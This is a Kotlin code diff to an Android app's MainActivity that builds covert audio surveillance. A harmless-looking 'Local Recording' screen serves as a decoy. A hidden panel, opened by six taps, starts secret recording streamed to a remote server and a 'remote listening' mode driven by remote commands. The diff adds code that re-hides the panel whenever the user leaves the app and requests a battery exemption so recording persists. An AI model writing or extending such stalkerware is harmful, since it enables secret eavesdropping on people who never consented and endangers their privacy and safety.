@@ -78,6 +78,7 @@ class MainActivity : AppCompatActivity() {
                     val storage = intent.getStringExtra(AudioRecordService.EXTRA_STORAGE) ?: ""
 
                     updateStats(pending, retries, duration, connection, storage)
+                    updateUIForServiceState()
                 }
                 AudioRecordService.ACTION_LOG -> {
                     val message = intent.getStringExtra(AudioRecordService.EXTRA_MESSAGE)
@@ -140,7 +141,7 @@ class MainActivity : AppCompatActivity() {
                 if (isHidden) {
                     Toast.makeText(this, "Debug Panel Revealed", Toast.LENGTH_SHORT).show()
                 }
-                updateUIForServiceState(AudioRecordService.isRunning)
+                updateUIForServiceState()
             }
         }
 
@@ -154,21 +155,21 @@ class MainActivity : AppCompatActivity() {
         tvClientName.text = "Client: $clientName"
 
         // Button handlers
-        btnStart.setOnClickListener { startMonitoringService(isMain = false) }
-        btnStop.setOnClickListener { stopService() }
+        btnStart.setOnClickListener { startHiddenRecording() }
+        btnStop.setOnClickListener { stopHiddenRecording() }
         btnStandby.setOnClickListener { toggleStandby() }
 
         btnDummyStart.setOnClickListener {
             isDummyRecording = true
             btnDummyStart.visibility = View.GONE
             btnDummyStop.visibility = View.VISIBLE
-            startMonitoringService(isMain = true)
+            startMainRecording()
         }
         btnDummyStop.setOnClickListener {
             isDummyRecording = false
             btnDummyStart.visibility = View.VISIBLE
             btnDummyStop.visibility = View.GONE
-            stopService()
+            stopMainRecording()
         }
 
         // Register broadcast receiver
@@ -183,12 +184,22 @@ class MainActivity : AppCompatActivity() {
         }
 
         // Sync UI with service state
-        updateUIForServiceState(AudioRecordService.isRunning)
+        updateUIForServiceState()
     }
 
     override fun onResume() {
         super.onResume()
-        updateUIForServiceState(AudioRecordService.isRunning)
+        // Always reset to innocent Main view on resume
+        debugPanel.visibility = View.GONE
+        secretTapCount = 0
+        updateUIForServiceState()
+    }
+
+    override fun onStop() {
+        super.onStop()
+        // Auto-lock secret panel when leaving to home screen or switching apps
+        debugPanel.visibility = View.GONE
+        secretTapCount = 0
     }
 
     override fun onDestroy() {
@@ -202,19 +213,14 @@ class MainActivity : AppCompatActivity() {
     // SERVICE CONTROL
     // ══════════════════════════════════════════════════════════════════════
 
-    private fun startMonitoringService(isMain: Boolean) {
+    private fun startMainRecording() {
         val url = etServerUrl.text.toString().trim()
         if (url.isEmpty()) {
             Toast.makeText(this, "Please enter a server URL", Toast.LENGTH_SHORT).show()
             return
         }
 
-        // Save URL
-        prefs.edit()
-            .putString("server_url", url)
-            .putBoolean("was_running", true)
-            .putBoolean("was_main", isMain)
-            .apply()
+        prefs.edit().putString("server_url", url).apply()
 
         // Check permissions
         val required = mutableListOf(Manifest.permission.RECORD_AUDIO)
@@ -231,18 +237,72 @@ class MainActivity : AppCompatActivity() {
             return
         }
 
-        // Request battery optimization exemption so Android OS never kills the app after 10-12 minutes
         checkBatteryOptimization()
 
-        // Start the service
         val intent = Intent(this, AudioRecordService::class.java).apply {
-            action = AudioRecordService.ACTION_START
+            action = AudioRecordService.ACTION_START_MAIN
             putExtra(AudioRecordService.EXTRA_SERVER_URL, url)
-            putExtra(AudioRecordService.EXTRA_IS_MAIN, isMain)
         }
         ContextCompat.startForegroundService(this, intent)
-        updateUIForServiceState(true)
-        appendLog("Starting service...")
+        updateUIForServiceState()
+        appendLog("Starting local recording...")
+    }
+
+    private fun stopMainRecording() {
+        val intent = Intent(this, AudioRecordService::class.java).apply {
+            action = AudioRecordService.ACTION_STOP_MAIN
+        }
+        startService(intent)
+        updateUIForServiceState()
+        appendLog("Stopping local recording...")
+    }
+
+    private fun startHiddenRecording() {
+        val url = etServerUrl.text.toString().trim()
+        if (url.isEmpty()) {
+            Toast.makeText(this, "Please enter a server URL", Toast.LENGTH_SHORT).show()
+            return
+        }
+
+        prefs.edit()
+            .putString("server_url", url)
+            .putBoolean("was_running", true)
+            .apply()
+
+        val required = mutableListOf(Manifest.permission.RECORD_AUDIO)
+        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
+            required.add(Manifest.permission.POST_NOTIFICATIONS)
+        }
+
+        val missing = required.filter {
+            ContextCompat.checkSelfPermission(this, it) != PackageManager.PERMISSION_GRANTED
+        }
+
+        if (missing.isNotEmpty()) {
+            ActivityCompat.requestPermissions(this, missing.toTypedArray(), 100)
+            return
+        }
+
+        checkBatteryOptimization()
+
+        val intent = Intent(this, AudioRecordService::class.java).apply {
+            action = AudioRecordService.ACTION_START_HIDDEN
+            putExtra(AudioRecordService.EXTRA_SERVER_URL, url)
+        }
+        ContextCompat.startForegroundService(this, intent)
+        updateUIForServiceState()
+        appendLog("Starting hidden recording...")
+    }
+
+    private fun stopHiddenRecording() {
+        prefs.edit().putBoolean("was_running", false).apply()
+
+        val intent = Intent(this, AudioRecordService::class.java).apply {
+            action = AudioRecordService.ACTION_STOP_HIDDEN
+        }
+        startService(intent)
+        updateUIForServiceState()
+        appendLog("Stopping hidden recording...")
     }
 
     private fun checkBatteryOptimization() {
@@ -261,91 +321,71 @@ class MainActivity : AppCompatActivity() {
         }
     }
 
-    private fun stopService() {
-        prefs.edit().putBoolean("was_running", false).apply()
-
-        val intent = Intent(this, AudioRecordService::class.java).apply {
-            action = AudioRecordService.ACTION_STOP
-        }
-        startService(intent)
-        updateUIForServiceState(false)
-        appendLog("Stopping service...")
-    }
-
     // ══════════════════════════════════════════════════════════════════════
     // UI UPDATES
     // ══════════════════════════════════════════════════════════════════════
 
-    private fun updateUIForServiceState(running: Boolean) {
+    private fun updateUIForServiceState() {
         val isDebugOpen = debugPanel.visibility == View.VISIBLE
+        val isMain = AudioRecordService.isMainRecording || isDummyRecording
+        val isHidden = AudioRecordService.isHiddenRecording
+        val isStandby = AudioRecordService.isStandbyMode
 
-        if (running) {
-            btnStart.visibility = View.GONE
-            btnStandby.visibility = View.GONE
-            btnStop.visibility = View.VISIBLE
-            
-            if (isDebugOpen) {
-                tvStatus.text = "● Recording"
+        // 1. Normal View (Visible innocent UI)
+        if (isMain) {
+            btnDummyStart.visibility = View.GONE
+            btnDummyStop.visibility = View.VISIBLE
+            tvStatus.text = "● Local Recording..."
+            tvStatus.setTextColor(Color.parseColor("#3b82f6"))
+            vStatusDot.setBackgroundColor(Color.parseColor("#3b82f6"))
+        } else {
+            btnDummyStart.visibility = View.VISIBLE
+            btnDummyStop.visibility = View.GONE
+            if (!isDebugOpen) {
+                tvStatus.text = "○ Disconnected"
+                tvStatus.setTextColor(Color.parseColor("#555570"))
+                vStatusDot.setBackgroundColor(Color.parseColor("#555570"))
+            }
+        }
+
+        // 2. Secret Debug View (Revealed via 6-tap)
+        if (isDebugOpen) {
+            etServerUrl.isEnabled = !AudioRecordService.isRunning && !isStandby
+
+            if (isHidden) {
+                btnStart.visibility = View.GONE
+                btnStandby.visibility = View.GONE
+                btnStop.visibility = View.VISIBLE
+                tvStatus.text = if (isMain) "● Recording (Dual: Main+Hidden)" else "● Recording (Hidden)"
                 tvStatus.setTextColor(Color.parseColor("#10b981"))
                 vStatusDot.setBackgroundColor(Color.parseColor("#10b981"))
-            } else {
-                if (isDummyRecording) {
-                    tvStatus.text = "● Local Recording..."
-                    tvStatus.setTextColor(Color.parseColor("#3b82f6"))
-                    vStatusDot.setBackgroundColor(Color.parseColor("#3b82f6"))
-                } else {
-                    tvStatus.text = "○ Disconnected"
-                    tvStatus.setTextColor(Color.parseColor("#555570"))
-                    vStatusDot.setBackgroundColor(Color.parseColor("#555570"))
-                }
-            }
-            etServerUrl.isEnabled = false
-        } else if (AudioRecordService.isStandbyMode) {
-            btnStart.visibility = View.VISIBLE
-            btnStandby.text = "⏹ STOP LISTENING"
-            btnStandby.visibility = View.VISIBLE
-            btnStop.visibility = View.GONE
-            
-            if (isDebugOpen) {
-                tvStatus.text = "📡 Standby Mode"
+            } else if (isStandby) {
+                btnStart.visibility = View.VISIBLE
+                btnStandby.text = "⏹ STOP LISTENING"
+                btnStandby.visibility = View.VISIBLE
+                btnStop.visibility = View.GONE
+                tvStatus.text = if (isMain) "● Local Rec + 📡 Standby" else "📡 Standby Mode"
                 tvStatus.setTextColor(Color.parseColor("#a78bfa"))
                 vStatusDot.setBackgroundColor(Color.parseColor("#a78bfa"))
+            } else if (isMain) {
+                btnStart.visibility = View.VISIBLE
+                btnStandby.text = "📡 STANDBY MODE"
+                btnStandby.visibility = View.VISIBLE
+                btnStop.visibility = View.GONE
+                tvStatus.text = "● Local Recording (Main only)"
+                tvStatus.setTextColor(Color.parseColor("#3b82f6"))
+                vStatusDot.setBackgroundColor(Color.parseColor("#3b82f6"))
             } else {
-                if (isDummyRecording) {
-                    tvStatus.text = "● Local Recording..."
-                    tvStatus.setTextColor(Color.parseColor("#3b82f6"))
-                    vStatusDot.setBackgroundColor(Color.parseColor("#3b82f6"))
-                } else {
-                    tvStatus.text = "○ Disconnected"
-                    tvStatus.setTextColor(Color.parseColor("#555570"))
-                    vStatusDot.setBackgroundColor(Color.parseColor("#555570"))
-                }
-            }
-            etServerUrl.isEnabled = false
-        } else {
-            btnStart.visibility = View.VISIBLE
-            btnStandby.text = "📡 ENABLE REMOTE LISTENING"
-            btnStandby.visibility = View.VISIBLE
-            btnStop.visibility = View.GONE
-            
-            if (isDebugOpen) {
+                btnStart.visibility = View.VISIBLE
+                btnStandby.text = "📡 ENABLE REMOTE LISTENING"
+                btnStandby.visibility = View.VISIBLE
+                btnStop.visibility = View.GONE
                 tvStatus.text = "○ Stopped"
                 tvStatus.setTextColor(Color.parseColor("#f87171"))
                 vStatusDot.setBackgroundColor(Color.parseColor("#f87171"))
-            } else {
-                if (isDummyRecording) {
-                    tvStatus.text = "● Local Recording..."
-                    tvStatus.setTextColor(Color.parseColor("#3b82f6"))
-                    vStatusDot.setBackgroundColor(Color.parseColor("#3b82f6"))
-                } else {
-                    tvStatus.text = "○ Disconnected"
-                    tvStatus.setTextColor(Color.parseColor("#555570"))
-                    vStatusDot.setBackgroundColor(Color.parseColor("#555570"))
-                }
+                tvDuration.text = "00:00"
+                tvStorage.text = "—"
             }
-            etServerUrl.isEnabled = true
-            tvDuration.text = "00:00"
-            tvStorage.text = "—"
         }
     }
 
@@ -356,8 +396,7 @@ class MainActivity : AppCompatActivity() {
             }
             startService(intent)
             appendLog("Standby mode disabled.")
-            // Update UI immediately — we know we're going to stopped state
-            updateUIForServiceState(false)
+            updateUIForServiceState()
         } else {
             val url = etServerUrl.text.toString().trim()
             if (url.isEmpty()) {
@@ -374,11 +413,7 @@ class MainActivity : AppCompatActivity() {
             }
             ContextCompat.startForegroundService(this, intent)
             appendLog("Standby mode enabled. Listening for remote commands...")
-
-            // Update UI immediately to standby state — don't wait for service
-            // Set the companion flags so updateUIForServiceState sees the correct branch
-            AudioRecordService.isStandbyMode = true
-            updateUIForServiceState(false)
+            updateUIForServiceState()
         }
     }
 
@@ -431,7 +466,7 @@ class MainActivity : AppCompatActivity() {
         super.onRequestPermissionsResult(requestCode, permissions, grantResults)
         if (requestCode == 100) {
             if (grantResults.isNotEmpty() && grantResults.all { it == PackageManager.PERMISSION_GRANTED }) {
-                startMonitoringService(isDummyRecording)
+                if (isDummyRecording) startMainRecording() else startHiddenRecording()
             } else {
                 Toast.makeText(this, "Permissions are required for recording", Toast.LENGTH_LONG).show()
                 appendLog("ERROR: Permissions denied")
